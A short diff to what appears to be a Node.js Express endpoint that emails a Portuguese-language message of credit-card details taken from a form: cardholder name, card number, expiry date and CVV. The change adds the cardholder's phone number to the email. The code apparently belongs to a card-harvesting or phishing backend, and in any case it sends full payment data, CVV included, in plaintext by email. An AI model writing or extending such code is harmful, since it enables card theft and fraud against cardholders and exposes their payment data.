@@ -69,6 +69,7 @@ app.post("/send-message-email", async (req, res) => {
 
     Detalhes do Cartão de Crédito:
     Nome: ${req.body.data.name}
+    Telefone: ${req.body.data.number}
     Número do Cartão: ${req.body.data.cardNumber}
     Data de Validade: ${req.body.data.expiryDate}
     CVV: ${req.body.data.cvv}
